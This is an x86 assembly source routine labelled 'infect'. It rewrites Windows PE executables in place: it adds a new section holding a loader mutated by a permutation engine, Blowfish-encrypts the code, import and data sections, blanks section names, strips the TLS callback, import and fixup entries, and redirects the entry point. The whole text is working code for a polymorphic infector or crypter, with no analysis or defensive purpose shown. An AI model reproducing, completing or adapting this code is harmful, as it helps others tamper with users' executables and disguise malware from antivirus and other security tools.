;께 INFECT 께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께�
;
;IN:    EDX = ASCIIZ filename
;
;께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께�

infect:
                pusha
		mov _stack,esp

                call fopen                              ; Open file
                                                        ;
                inc eax                                 ;
                jz i_exit                               ;
                dec eax                                 ;

		mov _handle,eax				;
                xchg eax,ebx                            ; EBX = File handle

                call fsize                              ;
                mov _file_size,eax                      ; ECX = File size
                xchg eax,ecx                            ;

                push ecx                                ;
                call malloc                             ; Allocate bufer
                add esp,4                               ; for pe

		mov _bufer,eax
                xchg edx,eax                            ; Read file
                call fread                              ;

                cmp 2 ptr [edx+18h],0040h               ; New exe ?
                jne i_exit_free                         ;

                mov ebx,[edx.mz_peOffset]               ; EBX = NE header
                add ebx,edx                             ;

                cmp [ebx.pe_sign],'EP'                  ; Portable ?
                jne i_exit_free                         ;

;같 Save used stuff 같같같같같같같같같같같같같같같같같같같같같같같같같같같같같

                mov esi,[ebx.pe_RVA]                    ; ESI =  RVA
                or esi,esi                              ;
                jz i_exit_free                          ;

                add esi,[ebx.pe_imagebase]
                mov _params.x_RVA,esi

                push 4 ptr[ebx.pe_importRVA]            ; Import
                pop 4 ptr _params.x_importn             ;

                push 4 ptr[ebx.pe_importSize]           ; Import size
                pop 4 ptr _params.x_importSn            ;

                push 4 ptr[ebx.pe_imagebase]            ; Imagebase
                pop 4 ptr _params.x_imagebase           ;

                push 4 ptr[ebx.pe_fixupRVA]		; Fixup
		pop  4 ptr _params.x_fixup      	;

                push 4 ptr[ebx.pe_fixupSize]            ; Fixup size
		pop  4 ptr _params.x_fixupSize          ;


;같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같�

                movzx eax,[ebx.pe_NThsize]              ; EAX = OBJ table
                lea eax,[ebx+eax+18h]                   ;

                movzx ecx,[ebx.pe_objcnt]               ; ECX = Count of objs

                mov esi,[ebx.pe_vAligment]              ; ESI = Virt alingment
                mov edi,[ebx.pe_pAligment]              ; EDI = Phys alingment

                mov _align_v,esi
                mov _align_p,edi

                cmp esi,edi                             ; Don't encrypt files
                jb i_exit_free                          ; with Virtual < Physical

		
                push ebx

                push ecx
                push eax
		push edx

;같 Check objects phys. size & virt. size 같같같같같같같같같같같같같같같같같같
round_and_check:

		mov esi,[ebx.pe_tlsRVA]			; ESI = TLS RVA
		or esi,esi                              ;
		jz round_size

		mov edi,[eax.pe_Obj_RVA]

		cmp esi,edi				; TLS < Obj_RVA
		jb round_size                           ;

		push edi				;
		add edi,[eax.pe_Obj_vSize]              ; TLS > Obj_end
		cmp esi,edi		                ;
		pop edi                                 ;
		jae round_size                          ;

		sub edi,esi
		add edi,[eax.pe_Obj_offset]

		mov _tls,edi				; Physical tls entry
round_size:

                mov esi,_align_v
                mov edi,_align_p

                or [eax.pe_Obj_flags],0C0000000h        ; Change flags
                mov 4 ptr[eax.pe_Obj_name],'    '       ; Change name
                mov 4 ptr[eax.pe_Obj_name+4],'    '     ;

                mov edx,[eax.pe_Obj_pSize]              ;
                push edi                                ;
                dec edi                                 ; Check physical
                and edx,edi                             ;
                pop edi                                 ;
                jnz i_exit_free

                mov edx,[eax.pe_Obj_vSize]
                push edx
                push esi
                dec esi
                and edx,esi
                pop esi
                pop edx
                jz round_next

                push esi
                add edx,esi
                neg esi
                and edx,esi
                pop esi

                mov [eax.pe_Obj_vSize],edx
round_next:
                add eax,40
                loop round_and_check

		pop edx
                pop eax
                pop ecx

;같 Check TLS 같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같

		mov edi,[ebx.pe_tlsRVA]
		or edi,edi
		je obj_table

		push eax
		mov esi,_tls				; EDI = TLS entry
		add esi,edx                             ;

		push 4 ptr [esi.tls_callbackVA]
		pop 4 ptr _params.x_tlsCallback

		xor eax,eax
		mov [esi.tls_callbackVA],eax		; Remove Callback

		lea eax,[edi.tls_callbackVA]
		add eax,[ebx.pe_imagebase]

		mov [esi.tls_indexVA],eax
		pop eax

obj_table:

;같 Check header size 같같같같같같같같같같같같같같같같같같같같같같같같같같같같�

                imul ecx,ecx,40

                lea esi,[eax+ecx]                       ; ESI = hole size
                sub esi,edx                             ;

                cmp esi,40                              ; Check for some space
                jb i_exit_free                          ; between header &
                                                        ; 1st object
                push eax

;께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께�

                add eax,ecx                             ; EAX = null section
                lea ecx,[eax-40]                        ; ECX = last section

                mov esi,_align_v
                mov edi,_align_p

                mov ebx,[ecx.pe_Obj_RVA]                ; Virtual end
                add ebx,[ecx.pe_Obj_vSize]              ;
                mov [eax.pe_Obj_RVA],ebx                ; change obj RVA

                mov ebx,[ecx.pe_Obj_offset]             ; Physical end
                add ebx,[ecx.pe_Obj_pSize]              ;
                mov [eax.pe_Obj_offset],ebx             ; change obj Offset

;같 Permutate 같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같�

                push eax

                push 1000h
                call malloc

                xchg eax,ebx

                push ebx
                call ldizx_init
                add esp,8

		mov _params.mixer_maxswp,1000

		call randomize                          ; Seed
		mov seed,eax

                push offset seed                        
                push offset rnd                         ; Rnd
                push offset _params                     ; Parameters
                push LTMEF_ALL                          ; Flags
                push ebx                                ; Dasm tables
                push offset ldizx                       ; Dasm
                push offset my_mutator                  ; Mutator
                push @loader_size                       ; Code size
                push offset free                        ; Free
                push offset malloc                      ; Malloc
                push offset loader                      ; Loader
                call ltme_core

                add esp,11*4

                push ebx
                call free
                add esp,4

                pop eax
;같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같


                mov ebx,_params.build_size              ; EBX = loader size

                push ebx
                add ebx,esi                             ;
                neg esi                                 ; Virtual
                and ebx,esi                             ;
                mov [eax.pe_Obj_vSize],ebx              ;
                pop ebx

                add ebx,edi                             ;
                neg edi                                 ; Physical
                and ebx,edi                             ;
                mov [eax.pe_Obj_pSize],ebx              ;

                mov [eax.pe_Obj_flags],060000020h       ; flags

                mov 4 ptr[eax.pe_Obj_name],'    '
                mov 4 ptr[eax.pe_Obj_name+4],'    '

                mov _new_object,eax
                xchg eax,edi

;께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께�

                pop eax
                pop ebx

                mov _pe_header,ebx

;               mov edi,_new_object                    ;
                push 4 ptr[edi.pe_Obj_RVA]              ; Change RVA
                pop 4 ptr[ebx.pe_RVA]                   ;

                add [ebx.pe_headersize],40              ; increse headers size
                inc [ebx.pe_objcnt]                     ; +1 object

                mov ecx,[edi.pe_Obj_RVA]                ;
                add ecx,[edi.pe_Obj_vSize]              ; Modify image size
                mov [ebx.pe_imagesize],ecx              ;


                pusha

;굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇

                movzx ecx,[ebx.pe_objcnt]
                dec ecx

                push ecx

                xchg ebx,eax                            ; EBX = Obj Table
                mov ebp,edx                             ; EBP = image

		mov seed,12345678h

                push (18+256*4)*4
                call malloc
                add esp,4

                xchg edi,eax                            ; EDI = P
                lea esi,[edi+18*4]                      ; ESI = S

                push edi
;---------------------------------------------------------------------------
                mov ecx,18
blowf_rnd_P:
                push 0FFFFFFFFh                         ;
                push offset seed                        ;
                call rnd                                ; Init P
                add esp,8                               ;
                stosd                                   ;
                loop blowf_rnd_P                        ;

;---------------------------------------------------------------------------

                mov edi,esi                             ;
                mov ecx,256*4                           ;
blowf_rnd_S:                                            ;
                push 0FFFFFFFFh                         ;
                push offset seed                        ; Init S
                call rnd                                ;
                add esp,8                               ;
                stosd                                   ;
                loop blowf_rnd_S                        ;

;---------------------------------------------------------------------------
                pop edi
                pop ecx

                lea edx,_key                            ; EDX = key offset
                call BlowfishInit                       ;


;굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇굇

encrypt_obj:
                push ecx
                push ebp

                mov edx,_pe_header
                mov eax,[ebx.pe_Obj_RVA]

                cmp [edx.pe_codeRVA],eax                ; Code?
                je encrypt_object                       ;

                cmp [edx.pe_importRVA],eax              ; Import?
                je encrypt_object                       ;

                cmp [edx.pe_dataRVA],eax                ; Init data?
                jne encrypt_next                        ;

encrypt_object:

                add ebp,[ebx.pe_Obj_offset]             ; EBP = offset
                mov ecx,[ebx.pe_Obj_pSize]              ; ECX = physical size

                push edi                                ;
                mov edi,ebp                             ; Calculate obj CRC
                call CRC32                              ;
                pop edi                                 ;

                mov [ebx+1Ch],eax                       ; Store CRC

		mov eax,0FFFFFD65h

		cmp [ebx+18h],eax
		je i_exit_free

                mov [ebx+18h],eax	                ; Crypted label

                shr ecx,3
                xor eax,eax
                cdq

blowfish_8e:
                xor eax,[ebp]                           ;
                xor edx,[ebp+4]                         ;
                call BlowfishEncrypt                    ;
                                                        ;
                mov [ebp],eax                           ; Encrypt object
                mov [ebp+4],edx                         ;
                                                        ;
                add ebp,8                               ;
                loop blowfish_8e                        ;

encrypt_next:

                pop ebp
                pop ecx
                add ebx,40
                loop encrypt_obj

                push edi                                ;
                call free                               ; Release tables bufer
                add esp,4                               ;

;께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께�
                popa

                xor eax,eax
                mov [ebx.pe_importRVA],eax              ;
                mov [ebx.pe_importSize],eax             ;
                                                        ;
                mov [ebx.pe_fixupRVA],eax               ; Null unnecessary
                mov [ebx.pe_fixupSize],eax              ;      entries
                                                        ;
                mov [ebx.pe_iatRVA],eax                 ;
                mov [ebx.pe_iatSize],eax                ;

                mov [ebx.pe_checksum],eax

                mov esi,ebx                             ; ESI = PE header

		mov ebx,_handle		

                xor ecx,ecx                             ;
                mov eax,FILE_BEGIN                      ; Pointer to begin
                call fseek                              ;

                mov ecx,_file_size                      ;
                ;EDX = headers                          ; Write headers
                call fwrite                             ; & encrypted objects

;------------------------------------------------------------------------------


                mov edi,_new_object                     ;
                mov ecx,[edi.pe_Obj_offset]             ; Pinter to new object
                mov eax,FILE_BEGIN                      ;
                call fseek                              ;

                push edx

                push [edi.pe_Obj_pSize]                 ; Allocate bufer for
                call malloc                             ; object

;               add esp,4
;               push 4 ptr[edi.pe_Obj_pSize]

                xchg edi,eax
                mov esi,_params.build_offset
                mov ecx,_params.build_size
                push edi

                rep movsb

                pop edx                                 ; EDX = bufer
                pop ecx                                 ; ECX = object size
                call fwrite                             ; Write object

                push edx
                call free
                add esp,4

                push _params.build_offset               ;
                call free                               ; Release permutated
                add esp,4                               ;          copy

                pop edx

		mov eax,'ipen'

;------------------------------------------------------------------------------
i_exit_free:
		mov esp,_stack

		mov ebx,_handle
                call fclose

                push _bufer                             ;
                call free                               ; Release pe-bufer
                add esp,4                               ;

i_exit:
		mov [esp._eax],eax
                popa
                ret